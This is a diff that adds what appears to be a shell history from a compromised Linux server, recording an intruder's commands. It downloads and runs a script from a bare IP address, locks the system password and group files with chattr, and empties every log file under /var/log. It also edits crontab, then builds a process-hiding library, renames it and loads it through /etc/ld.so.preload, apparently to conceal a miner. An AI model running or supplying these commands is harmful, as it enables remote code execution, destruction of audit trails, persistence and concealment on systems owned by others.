@@ -1,0 +1,52 @@
+rm -rf d.sh
+wget http://104.215.156.58:5000/d.sh
+chmod +x d.sh
+./d.sh
+exit
+screen -r
+chattr +i /etc/passwd
+chattr +i /etc/shadow
+chattr +i /etc/group
+chattr +i /etc/hshadow
+chattr +i /etc/gshadow
+ip a
+curl ifconfig.co
+exxit
+exit
+screen -r
+w
+nano /etc/crontab
+for i in $(find /var/log -type f); do cat /dev/null > $i; done
+w
+htop
+yum install htop
+htop
+w
+lscpu
+nano /etc/yam
+exit
+w
+screen -r
+exit
+w
+screen -r
+nano /etc/yam
+screen -r
+nano /etc/hostname
+top
+w
+git clone https://github.com/gianlucaborello/libprocesshider
+cd libprocesshider/
+nano processhider.c
+nano Makefile
+make
+yum groupinstall "Development Tools"
+make
+mv libmetadata.so /usr/local/lib
+echo /usr/local/lib/libmetadata.so >> /etc/ld.so.preload
+top
+w
+htop
+yum remove htop
+exit
+:
